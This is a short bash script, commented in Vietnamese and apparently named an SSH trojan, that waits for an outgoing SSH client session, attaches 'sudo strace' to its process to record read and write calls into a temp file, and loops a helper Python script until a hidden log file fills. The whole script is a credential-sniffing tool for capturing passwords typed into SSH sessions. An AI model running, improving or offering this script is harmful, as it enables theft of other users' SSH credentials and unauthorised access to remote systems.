#!/bin/bash

SSH_PROCESS=$(pgrep -a ssh | grep -E "ssh.*@.*")
LOG_FILE="/tmp/.log_sshtrojan2.txt"
PROCESS_NAME="python3 test.py"

while true; do
    # Kiểm tra tiến trình SSH
    SSH_PROCESS=$(pgrep -a ssh | grep -E "ssh.*@.*")
    
    if [[ -n "$SSH_PROCESS" ]]; then
        echo "Tìm thấy tiến trình SSH!"
        echo "Find: $SSH_PROCESS"
        
        # Lấy PID
        PID=$(echo "$SSH_PROCESS" | awk '{print $1}')
        
        # Kiểm tra xem PID có hợp lệ không
        if [[ -n "$PID" ]]; then
            echo "SSH đang chạy với PID: $PID"
            break  # Thoát vòng lặp khi tìm thấy PID hợp lệ
        fi
    fi
    
    echo "Không tìm thấy tiến trình SSH, tiếp tục kiểm tra..."
    sleep 2  # Chờ 2 giây trước khi kiểm tra lại

done

echo "Bắt đầu theo dõi tiến trình SSH có PID: $PID"

# Chạy strace với PID
nohup sudo strace -p "$PID" -e read,write -s 500 > /tmp/strace_output.txt 2>&1 &
sleep 2

while true; do
    if [[ -s "$LOG_FILE" ]]; then
        echo "Phát hiện nội dung trong file log:"
        cat "$LOG_FILE"  # In nội dung file
        pkill -f "$PROCESS_NAME"  # Dừng tiến trình Python
        break  # Thoát vòng lặp
    else
        echo "Log file rỗng, chạy lại $PROCESS_NAME..."
        pkill -f "$PROCESS_NAME"
        python3 test.py
        sleep 5
    fi
done

echo "Completed!"

